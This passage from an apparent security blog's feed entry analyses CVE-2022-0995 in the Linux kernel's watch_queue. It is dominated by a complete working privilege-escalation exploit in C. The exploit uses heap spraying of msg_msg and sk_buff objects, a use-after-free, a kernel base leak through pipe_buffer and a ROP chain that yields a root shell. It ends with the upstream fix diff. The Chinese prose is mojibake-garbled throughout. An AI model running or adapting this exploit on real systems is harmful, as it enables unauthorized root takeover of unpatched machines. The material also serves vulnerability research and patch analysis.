class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// pipe to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(oob_pipe_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2022/04/06/Fk975jsZhPfvyCJ.png" alt="image.png"></p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03.æ¼æ´ä¿®å¤"></a>0x03.æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´åœ¨å†…æ ¸ä¸»çº¿çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb">è¿™ä¸ª commit</a> ä¸­è¢«ä¿®å¤ï¼Œè¿™ä¸ª commit å¢åŠ çš„ä¿®æ”¹æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¯¹äºè¯¥æ¼æ´å…¶æ”¹å˜çš„éƒ¨åˆ†ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-meta">@@ -320,7 +319,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br>     tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br> goto err_filter;<br> /* Ignore any unknown types */<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> nr_filter++;<br> &#125;<br><span class="hljs-meta">@@ -336,7 +335,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br> <br> q = wfilter-&gt;filters;<br> for (i = 0; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> <br> q-&gt;type= tf[i].type;<br></code></pre></td></tr></table></figure><ul><li>ä¿®å¤äº†å‰ååˆ¤å®šä¸ä¸€è‡´çš„é—®é¢˜</li><li>å°† type çš„èŒƒå›´é™å®šä¸º <code>WATCH_TYPE__NR</code>ï¼ˆå€¼ä¸º 2ï¼‰</li></ul><p>ç¬”è€…ä¸ªäººè®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘åœ¨çœ‹ç€ä½ ğŸ‘_ğŸ‘&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
